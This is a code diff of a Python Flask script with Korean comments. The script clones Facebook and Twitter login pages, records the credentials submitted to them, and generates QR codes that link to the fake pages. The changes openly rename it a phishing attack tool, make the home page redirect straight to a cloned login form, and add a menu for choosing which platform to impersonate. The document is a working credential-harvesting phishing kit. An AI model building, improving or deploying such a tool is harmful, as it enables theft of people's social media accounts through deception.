@@ -1,10 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-소셜 미디어 로그인 페이지
-Instagram, Facebook, Twitter 로그인 페이지 재현
-QR 코드 생성 기능 통합
-"""
 
 from flask import Flask, render_template, request, jsonify, redirect, url_for
 import qrcode
@@ -25,6 +20,9 @@ REAL_SOCIAL_URLS = {
 
 # 로그인 시도 로그 저장
 LOGIN_LOGS = []
+
+# 기본 홈페이지 설정
+DEFAULT_HOME_PAGE = 'facebook'  # 기본값, 실행 시 변경됨
 
 def save_login_attempt(platform, credentials, success=False):
     """로그인 시도를 로그에 저장"""
@@ -56,7 +54,9 @@ def generate_qr_code_file(url, platform_name, save_path=None):
     
     if save_path is None:
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        save_path = f"{platform_name}_qr_{timestamp}.png"
+        # 현재 작업 디렉토리에 저장
+        current_dir = os.getcwd()
+        save_path = os.path.join(current_dir, f"{platform_name}_qr_{timestamp}.png")
     
     img.save(save_path)
     return save_path
@@ -64,7 +64,7 @@ def generate_qr_code_file(url, platform_name, save_path=None):
 def qr_generator_menu():
     """QR 코드 생성 메뉴"""
     print("=" * 50)
-    print("🔐 소셜 미디어 로그인 QR 코드 생성기")
+    print("🎣 피싱 공격 QR 코드 생성기")
     print("=" * 50)
     print()
     
@@ -177,10 +177,27 @@ def start_qr_generator():
 def show_startup_menu():
     """시작 메뉴 표시"""
     print("=" * 60)
-    print("🔐 소셜 미디어 로그인 서비스")
+    print("🎣 소셜 미디어 피싱 공격 도구")
     print("=" * 60)
     print()
-    print("실행 모드를 선택하세요:")
+    print("기본 홈페이지를 선택하세요:")
+    print("1. 👥 Facebook 로그인 페이지")
+    print("2. � Twitter 로그인 페이지")
+    print()
+    
+    while True:
+        choice = input("선택 (1-2): ").strip()
+        
+        if choice == '1':
+            return 'facebook'
+        elif choice == '2':
+            return 'twitter'
+        else:
+            print("❌ 잘못된 선택입니다. 다시 선택해주세요.")
+
+def show_execution_menu():
+    """실행 모드 선택 메뉴"""
+    print("\n실행 모드를 선택하세요:")
     print("1. 🌐 웹 서버만 실행")
     print("2. 📱 QR 코드 생성기만 실행")
     print("3. 🚀 웹 서버 + QR 생성기 동시 실행")
@@ -204,8 +221,13 @@ def show_startup_menu():
 
 @app.route('/')
 def index():
-    """메인 페이지 - 플랫폼 선택"""
-    return render_template('index.html')
+    """메인 페이지 - 선택된 플랫폼으로 리다이렉트"""
+    if DEFAULT_HOME_PAGE == 'facebook':
+        return redirect(url_for('facebook_login'))
+    elif DEFAULT_HOME_PAGE == 'twitter':
+        return redirect(url_for('twitter_login'))
+    else:
+        return redirect(url_for('facebook_login'))  # 기본값
 
 @app.route('/facebook')
 def facebook_login():
@@ -256,25 +278,15 @@ def handle_login(platform):
     
     return jsonify({'success': False, 'message': '지원하지 않는 플랫폼입니다.'})
 
-@app.route('/admin')
-def admin_panel():
-    """관리자 패널 - 로그인 시도 확인"""
-    return render_template('admin.html', logs=LOGIN_LOGS)
-
-@app.route('/api/logs')
-def get_logs():
-    """로그 데이터 API"""
-    return jsonify(LOGIN_LOGS)
-
 def start_web_server():
     """웹 서버 시작"""
     # templates 폴더 생성
     if not os.path.exists('templates'):
         os.makedirs('templates')
     
-    print("소셜 미디어 로그인 서비스 시작...")
+    platform_name = "Facebook" if DEFAULT_HOME_PAGE == 'facebook' else "Twitter"
+    print(f"피싱 공격 서버 시작... (기본 페이지: {platform_name})")
     print("서버 주소: http://localhost:5000")
-    print("관리자 패널: http://localhost:5000/admin")
     print("종료하려면 Ctrl+C를 누르세요")
     print()
     
@@ -291,12 +303,17 @@ if __name__ == '__main__':
                     print("프로그램을 종료합니다.")
                     sys.exit(0)
             elif mode == 'server':
+                # 기본 홈페이지 선택
+                DEFAULT_HOME_PAGE = show_startup_menu()
                 start_web_server()
             else:
                 print("사용법: python social_login_simulator.py [server|qr]")
         else:
-            # 시작 메뉴 표시
-            mode = show_startup_menu()
+            # 기본 홈페이지 선택
+            DEFAULT_HOME_PAGE = show_startup_menu()
+            
+            # 실행 모드 선택
+            mode = show_execution_menu()
             
             if mode == 'server':
                 start_web_server()
